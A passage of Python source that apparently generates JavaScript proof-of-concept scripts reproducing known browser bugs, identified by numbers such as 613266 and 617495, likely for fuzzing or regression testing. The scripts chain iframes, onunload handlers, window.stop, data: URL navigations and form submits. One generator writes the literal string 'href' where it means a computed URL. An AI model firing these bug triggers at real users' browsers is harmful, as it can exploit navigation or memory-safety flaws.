            inst = self.script_builder.generate_web_instruction(i1, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)

            base = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"base"'], base, "Document", WebApiType.call_method, "querySelector")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(base, [], None, "Element", WebApiType.call_method, "remove")
            catch_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            catch_inst.append(inst)

            de = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{c}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)
            
            inst = self.script_builder.generate_try_catch(try_inst, catch_inst)
            f_inst.append(inst)
        else:
            cond = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction(i1, [], cond, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            f_inst.append(inst)

            else_inst = []

            inst = self.script_builder.generate_web_instruction(i1, [], "null", "HTMLIFrameElement", WebApiType.write_property, "onload")
            else_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("668552")
            inst = self.script_builder.generate_web_instruction(i1, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)

            base = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"base"'], base, "Document", WebApiType.call_method, "querySelector")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(base, [], None, "Element", WebApiType.call_method, "remove")
            else_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            else_inst.append(inst)

            de = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{c}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)
            
            inst = self.script_builder.generate_if_else(cond, [], else_inst)
            f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        iframe_src =  self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(i1, [], f"'{iframe_src}'", "Document", WebApiType.write_property, "src")
        self.script_builder.add_instruction(inst)

    def generate_613266(self):
        f = self.script_builder.get_new_function_name()
        f_inst = []

        inst = self.script_builder.generate_web_instruction(None, [], f, "Built-in", WebApiType.write_property, "onload")
        self.script_builder.add_instruction(inst)

        a = self.script_builder.get_new_variable_name()
        i1 = self.script_builder.get_new_variable_name()
        i1_cd = self.script_builder.get_new_variable_name()

        inst = self.script_builder.generate_web_instruction(i1, [], i1_cd, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(i1_cd, ["'a'"], a, "Document", WebApiType.call_method, "createElement")
        f_inst.append(inst)

        href = "'data:text/xml,'"
        inst = self.script_builder.generate_web_instruction(a, [], href, "HTMLAnchorElement", WebApiType.write_property, "href")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "click")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        
        i0 = self.script_builder.get_new_variable_name()
        de = self.script_builder.get_new_variable_name()
        
        inst = self.script_builder.generate_web_instruction("document", ["'iframe'"], i0, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(de, [i0], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        i0_cd = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i0, [], i0_cd, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(i0_cd, [], None, "Document", WebApiType.call_method, "open")
        self.script_builder.add_instruction(inst)

        
        inst = self.script_builder.generate_web_instruction("document", ["'iframe'"], i1, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(de, [i1], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        src = "'data:text/html,a'"
        inst = self.script_builder.generate_web_instruction(i1, [], src, "HTMLIFrameElement", WebApiType.write_property, "src")
        self.script_builder.add_instruction(inst)

        i10 = self.script_builder.get_new_variable_name()

        inst = self.script_builder.generate_web_instruction("document", ["'iframe'"], i10, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(i1, [], i1_cd, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
        self.script_builder.add_instruction(inst)

        i1_body = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i1_cd, [], i1_body, "Document", WebApiType.read_property, "body")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(i1_body, [i10], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        i10_cw = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i10, [], i10_cw, "HTMLIFrameElement", WebApiType.read_property, "contentWindow")
        self.script_builder.add_instruction(inst)

        onunload_f = self.script_builder.get_new_function_name()
        onunload_f_inst = []

        
        inst = self.script_builder.generate_web_instruction(i10_cw, [], onunload_f, "Window", WebApiType.write_property, "onunload")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(i10, [], i10_cw, "HTMLIFrameElement", WebApiType.read_property, "contentWindow")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(i10_cw, [], "null", "Window", WebApiType.write_property, "onunload")
        onunload_f_inst.append(inst)

        rs = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", [], rs, "Document", WebApiType.read_property, "readyState")
        onunload_f_inst.append(inst)

        complete = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_js_instruction("'loading'", [], complete, "ReadyStateString", JsApiType.assign, None)
        onunload_f_inst.append(inst)

        cond = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_js_instruction(rs, [complete], cond, "ReadyStateString", JsApiType.operation_equal, None)
        onunload_f_inst.append(inst)

        if_inst = []

        inst = self.script_builder.generate_web_instruction("location", [], None, "Location", WebApiType.call_method, "reload")
        if_inst.append(inst)
        
        inst = self.script_builder.generate_if_else(cond, if_inst, [])
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(i0_cd, [], None, "Document", WebApiType.call_method, "close")
        onunload_f_inst.append(inst)

        a = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i1_cd, ["'a'"], a, "Document", WebApiType.call_method, "createElement")
        onunload_f_inst.append(inst)

        href = "'data:text/html,'"
        inst = self.script_builder.generate_web_instruction(a, [], href, "HTMLAnchorElement", WebApiType.write_property, "href")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "click")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(i1_cd, ["'a'"], a, "Document", WebApiType.call_method, "createElement")
        onunload_f_inst.append(inst)

        href = "'about:blank'"
        inst = self.script_builder.generate_web_instruction(a, [], href, "HTMLAnchorElement", WebApiType.write_property, "href")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "click")
        onunload_f_inst.append(inst)

        d = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i1, [], d, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(d, ["'iframe'"], i10, "Document", WebApiType.call_method, "createElement")
        onunload_f_inst.append(inst)

        d_body = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, [], d_body, "Document", WebApiType.read_property, "body")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(d_body, [i10], None, "Element", WebApiType.call_method, "appendChild")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(i10, [], i10_cw, "HTMLIFrameElement", WebApiType.read_property, "contentWindow")
        onunload_f_inst.append(inst)

        i10_onunload_f = self.script_builder.get_new_function_name()
        i10_onunload_f_inst = []

        inst = self.script_builder.generate_web_instruction(i10_cw, [], i10_onunload_f, "Window", WebApiType.write_property, "onunload")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction("window", [], None, "Window", WebApiType.call_method, "stop")
        i10_onunload_f_inst.append(inst)

        f = self.script_builder.get_new_function_name()
        f_inst = []

        inst = self.script_builder.generate_web_instruction(None, [f, 1], None, "Built-in", WebApiType.call_method, "setTimeout")
        i10_onunload_f_inst.append(inst)

        inst = self.script_builder.generate_function(i10_onunload_f, [], None, i10_onunload_f_inst)
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(d, ["'a'"], a, "Document", WebApiType.call_method, "createElement")
        onunload_f_inst.append(inst)

        href = self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(a, [], f"'{href}'", "HTMLAnchorElement", WebApiType.write_property, "href")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "click")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_function(onunload_f, [], None, onunload_f_inst)
        self.script_builder.add_instruction(inst)

        i1_onload_f = self.script_builder.get_new_function_name()
        i1_onload_f_inst = []

        inst = self.script_builder.generate_web_instruction(i1, [], i1_onload_f, "HTMLIFrameElement", WebApiType.write_property, "onload")
        f_inst.append(inst)

        x = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ["'form'"], x, "Document", WebApiType.call_method, "createElement")
        i1_onload_f_inst.append(inst)

        action = self.script_builder.get_javascript_console_log("613266")
        inst = self.script_builder.generate_web_instruction(x, [], f"'{action}'", "HTMLFormElement", WebApiType.write_property, "action")
        i1_onload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(x, [], None, "HTMLFormElement", WebApiType.call_method, "submit")
        i1_onload_f_inst.append(inst)

        inst = self.script_builder.generate_function(i1_onload_f, [], None, i1_onload_f_inst)
        f_inst.append(inst)

        src = self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(i1, [], f"'{src}'", "HTMLIFrameElement", WebApiType.write_property, "src")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

    def generate_617495(self):
        i = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ["'iframe'"], i, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        de = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(de, [i], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        d = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i, [], d, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(d, [], None, "Document", WebApiType.call_method, "open")
        self.script_builder.add_instruction(inst)

        s = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ["'iframe'"], s, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(d, [s], None, "Document", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        onload_f = self.script_builder.get_new_function_name()
        onload_f_inst = []

        inst = self.script_builder.generate_web_instruction(None, [], onload_f, "Built-in", WebApiType.write_property, "onload")
        self.script_builder.add_instruction(inst)

        a = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ["'a'"], a, "Document", WebApiType.call_method, "createElement")
        onload_f_inst.append(inst)

        href = "'data:text/xml,'"
        inst = self.script_builder.generate_web_instruction(a, [], href, "HTMLAnchorElement", WebApiType.write_property, "href")
        onload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "click")
        onload_f_inst.append(inst)

        inst = self.script_builder.generate_function(onload_f, [], None, onload_f_inst)
        self.script_builder.add_instruction(inst)

        s_cw = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(s, [], s_cw, "HTMLIFrameElement", WebApiType.read_property, "contentWindow")
        self.script_builder.add_instruction(inst)

        onunload_f = self.script_builder.get_new_function_name()
        onunload_f_inst = []
        inst = self.script_builder.generate_web_instruction(s_cw, [], onunload_f, "Window", WebApiType.write_property, "onunload")
        self.script_builder.add_instruction(inst)

        g = self.script_builder.get_new_function_name()
        g_inst = []

        inst = self.script_builder.generate_web_instruction("window", [], None, "Window", WebApiType.call_method, "stop")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(None, [g, 1], None, "Built-in", WebApiType.call_method, "setTimeout")
        onunload_f_inst.append(inst)

        inst = self.script_builder.generate_function(onunload_f, [], None, onunload_f_inst)
        self.script_builder.add_instruction(inst)

        i_onload = self.script_builder.get_new_function_name()
        i_onload_inst = []

        inst = self.script_builder.generate_web_instruction(i, [], i_onload, "HTMLIFrameElement", WebApiType.write_property, "onload")
        g_inst.append(inst)

        x = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ["'form'"], x, "Document", WebApiType.call_method, "createElement")
        i_onload_inst.append(inst)

        action = self.script_builder.get_javascript_console_log("617495")
        inst = self.script_builder.generate_web_instruction(x, [], f"'{action}'", "HTMLFormElement", WebApiType.write_property, "action")
        i_onload_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(x, [], None, "HTMLFormElement", WebApiType.call_method, "submit")
        i_onload_inst.append(inst)

        inst = self.script_builder.generate_function(i_onload, [], None, i_onload_inst)
        g_inst.append(inst)

        src = self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(i, [], f"'{src}'", "HTMLIFrameElement", WebApiType.write_property, "src")
        g_inst.append(inst)

        inst = self.script_builder.generate_function(g, [], None, g_inst)
        self.script_builder.add_instruction(inst)

        f = self.script_builder.get_new_function_name()
        f_inst = []

        inst = self.script_builder.generate_web_instruction(d, ["'a'"], a, "Document", WebApiType.call_method, "createElement")
        f_inst.append(inst)

        href = "'data:text/html,'"
        inst = self.script_builder.generate_web_instruction(a, [], href, "HTMLAnchorElement", WebApiType.write_property, "href")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "click")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(d, [], None, "Document", WebApiType.call_method, "close")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(d, ["'a'"], a, "Document", WebApiType.call_method, "createElement")
        f_inst.append(inst)

        href = "'#'"
        inst = self.script_builder.generate_web_instruction(a, [], href, "HTMLAnchorElement", WebApiType.write_property, "href")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "click")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(d, ["'a'"], a, "Document", WebApiType.call_method, "createElement")
        f_inst.append(inst)

        href = self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(a, [], f"'href'", "HTMLAnchorElement", WebApiType.write_property, "href")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "click")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(None, [f, 100], None, "Built-in", WebApiType.call_method, "setTimeout")
        self.script_builder.add_instruction(inst)


def main():
    from src.script.script_builder import ScriptBuilder
    sb = ScriptBuilder()
    pb = PocBuilder(sb)

    pb.generate_617495()
    print(sb.script.lift())


if __name__ == "__main__":
    main()
